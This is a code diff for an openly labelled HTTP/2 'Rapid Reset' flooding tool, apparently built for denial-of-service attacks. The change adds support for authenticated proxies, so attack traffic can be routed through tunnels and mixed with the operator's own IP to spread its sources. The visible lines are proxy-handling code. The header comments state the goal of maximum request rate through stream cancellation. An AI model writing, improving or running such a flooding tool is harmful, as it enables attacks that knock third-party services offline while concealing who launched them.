@@ -1,7 +1,7 @@
 // R10-1: RAPID-FIRE - HTTP/2 Rapid Reset Specialist
 // Focus: Maximum request rate with minimal CPU
 // Technique: Stream cancellation + Connection reuse
-// Updated: Mixed main IP + proxies
+// Updated: Mixed main IP + proxies + authenticated proxy support
 
 const http2 = require('http2');
 const tls = require('tls');
@@ -15,18 +15,41 @@ const CPU_CORES = os.cpus().length;
 let proxies = [];
 let userAgents = [];
 
+// Parse proxy line - supports both formats: host:port and host:port:username:password
+function parseProxy(proxyLine) {
+    const parts = proxyLine.split(':');
+    if (parts.length === 4) {
+        return {
+            host: parts[0],
+            port: parseInt(parts[1]),
+            username: parts[2],
+            password: parts[3],
+            auth: true
+        };
+    } else if (parts.length >= 2) {
+        return {
+            host: parts[0],
+            port: parseInt(parts[1]),
+            auth: false
+        };
+    }
+    return null;
+}
+
 // Load proxies and user agents
 try {
-    proxies = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
+    const proxyLines = fs.readFileSync('proxy.txt', 'utf-8').split('\n')
         .map(line => line.trim())
-        .filter(line => line && !line.startsWith('#') && line.includes(':'));
-    console.log(`[R10-1] Loaded ${proxies.length} proxies`);
+        .filter(line => line && !line.startsWith('#'));
+    
+    proxies = proxyLines.map(parseProxy).filter(p => p !== null);
+    console.log(`[R10-1] Loaded ${proxies.length} proxies (${proxies.filter(p => p.auth).length} authenticated)`);
 } catch (e) {
     console.log('[R10-1] No proxy.txt found, running with main IP only');
 }
 
 // Add MAIN IP to proxy list (special flag)
-const USE_MAIN_IP = true; // Set to true to use main IP
+const USE_MAIN_IP = true;
 const MIX_RATIO = 0.3; // 30% main IP, 70% proxies
 
 try {
@@ -65,10 +88,21 @@ function shouldUseMainIp() {
 
 function createProxiedConnection(proxy, targetHost) {
     return new Promise((resolve, reject) => {
-        const [proxyHost, proxyPort] = proxy.split(':');
+        const proxyHost = proxy.host;
+        const proxyPort = proxy.port;
         
-        const socket = net.connect(parseInt(proxyPort), proxyHost, () => {
-            socket.write(`CONNECT ${targetHost}:443 HTTP/1.1\r\nHost: ${targetHost}:443\r\n\r\n`);
+        const socket = net.connect(proxyPort, proxyHost, () => {
+            // Build CONNECT request with optional auth
+            let connectReq = `CONNECT ${targetHost}:443 HTTP/1.1\r\nHost: ${targetHost}:443\r\n`;
+            
+            if (proxy.auth) {
+                const auth = Buffer.from(`${proxy.username}:${proxy.password}`).toString('base64');
+                connectReq += `Proxy-Authorization: Basic ${auth}\r\n`;
+            }
+            
+            connectReq += '\r\n';
+            
+            socket.write(connectReq);
             
             socket.once('data', () => {
                 const tlsSocket = tls.connect({
